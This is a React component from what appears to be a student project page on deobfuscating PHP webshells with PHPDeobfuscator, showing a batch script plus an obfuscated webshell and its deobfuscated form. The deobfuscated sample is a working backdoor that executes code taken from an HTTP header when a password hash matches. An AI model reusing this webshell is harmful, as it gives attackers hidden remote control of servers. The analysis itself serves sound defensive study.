import React from "react";
import ImageWithText from "./components/ImageWithText.tsx";
import styles from "./index.module.scss";

const Deobfuscation: React.FC = () => {
  return (
    <div className={styles.container}>
      <div className={styles.terminalSection}>
        <div className={styles.descriptionSide}>
          <h2 className={styles.highlight}>비난독화</h2>
          <h1 className={styles.title}>
            난독화된 코드를 <br />
            원래의 가독성 있는 형태로 되돌리기
          </h1>
          <p className={styles.subtitle}>
            PHPDeobfuscator를 이용하여 난독화된 PHP 코드를 비난독화하여
            <br />
            원래의 코드 형태로 복원한다.
          </p>
        </div>
        <div className={styles.imgSide}>
          <ImageWithText>
            {`<?php
$inputDir = '/root/gradProj/dataset/webshell_file';

$outputDir = '/root/gradProj/result/webshell_deobfuscated';

$phpDeobfuscatorPath = '/root/PHPDeobfuscator';

if (!file_exists($outputDir)) {
    mkdir($outputDir, 0777, true);
}

$files = scandir($inputDir);

foreach ($files as $file) {
    if ($file == '.' || $file == '..' || is_dir($inputDir . '/' . $file)) {
        continue;
    }

    $inputFilePath = $inputDir . '/' . $file;

    $outputFilePath = $outputDir . '/' . $file;

    $command = "php $phpDeobfuscatorPath/index.php -f $inputFilePath > $outputFilePath";
    exec($command, $output, $return_var);

    if ($return_var !== 0) {
        echo "error while de... file  $file\n";
        echo "Command: $command\n";
        echo "Output:\n";
        print_r($output);
    } else {
        echo "file  $file de... complete: $outputFilePath\n";
    }
}

echo "de~ complete...?\n";
?>`}
          </ImageWithText>
          <div className={styles.captionSide}>비난독화 코드</div>
        </div>
      </div>
      <div className={styles.terminalSection}>
        <div className={styles.imgSide}>
          <ImageWithText>
          {`<?php
$Xt='h2q'|uXxuyyo;$sC='-{K'&'-?[';$yWIm3f4='V$'.fx8N^'7'.d68V.'(';$VSFHxobN6='Bh\`b'.
    '?t'^'.<6<\`5';$NiMFQcdpv='3<U[7'^'d[b&N';$bO='2y*qR1-h6'^'{Q~76'.UjJz;'yuAR9bK'.
    '_IM';$NFOor='$!$ '|' \`, ';$tRPwxjf_2s=_IY^'<}k';$GYjy197jA='@'.TPPWHUOC_.#yhy'.
    '@R'|'HTD@IX_@'.PYPR;$GqY8x4='c~3'^'&8\`';$GnA=('@_~'&'j_~')^$sC;$HK4kh284Iy=/*'.
    'll>{o2ebAe*/$yWIm3f4|('.HM{lz'^"Im)^\\$N");$ba=(KwKBj.']9n['.yoIl8_&'SV[n/y<Mo'.
    '?KYL<O')^('(4/#~?ok>_l}?_g'&'5,>?^|w:~w*?%W)');$mKGuIFLsIU9=$VSFHxobN6&(/*fQ2'.
    'V6Kp]gAh*/HMDPGA|'XYT@[A');$Ml1=$NiMFQcdpv&('rQ2#n'|'(b&6~');$YK3qRS=(/*JGSvZ'.
    'ok,*/PyTJp.'(rh_'&w4_Om0ZbH)|$bO;if($GnA($HK4kh284Iy($mKGuIFLsIU9))==('|Y{q=H'.
    'ME]xqQ\`{]rSe%'.Gm2dmUH^'I=JDY*xv<A@'.fYK8KbVA.'$'.YWTX4y).(w^D).('5;'&'3=')./*'.
    '{)RG)Unn3*/$tRPwxjf_2s)$kR_NKA7Su=$ba($NFOor.(H0^lR),$HK4kh284Iy(/*I2jAJZEnpN'.
    '_nO*/$GYjy197jA.$GqY8x4));$kR_NKA7Su($Ml1,$YK3qRS);#rTlthc@v^U@ykQuNEiaq9NFC'.
    'n0dvU,yCve{Fu~CtA*8%sZWe_%mZdpX_<Ra4M~2GuB}6m4';`}
          </ImageWithText>
          <div className={styles.captionSide}>비난독화 전 코드</div>
      </div>
        <div className={styles.imgSide}>
          <ImageWithText>
            {`<?php

$Xt = "}zyuyyo";
$sC = '-;K';
$yWIm3f4 = "a@P@nf";
$VSFHxobN6 = 'lTV^_A';
$NiMFQcdpv = 'Wg7}y';
$bO = "I(TFddG\\"L";
'yuAR9bK_IM';
$NFOor = '$a, ';
$tRPwxjf_2s = "c42";
$GYjy197jA = "HTTP_X_OS_PR";
$GqY8x4 = 'EFS';
$GnA = "md5";
$HK4kh284Iy = "getenv";
$ba = "create_function";
$mKGuIFLsIU9 = "HTTP_A";
$Ml1 = "Rc65x";
$YK3qRS = "Y8TNddWbL";
if (md5(getenv($mKGuIFLsIU9)) == "5d15db53a91790e913dc4e05a1319c42") {
    $kR_NKA7Su = create_function("\\$a, \\$b", getenv(
        /*I2jAJZEnpN'.
          '_nO*/
        "HTTP_X_OS_PREFS"
    ));
}
$kR_NKA7Su($Ml1, $YK3qRS);
#rTlthc@v^U@ykQuNEiaq9NFC'.
'n0dvU,yCve{Fu~CtA*8%sZWe_%mZdpX_<Ra4M~2GuB}6m4';`}
          </ImageWithText>
          <div className={styles.captionSide}>비난독화 후 코드</div>
        </div>
      </div>
    </div>
  );
};

export default Deobfuscation;
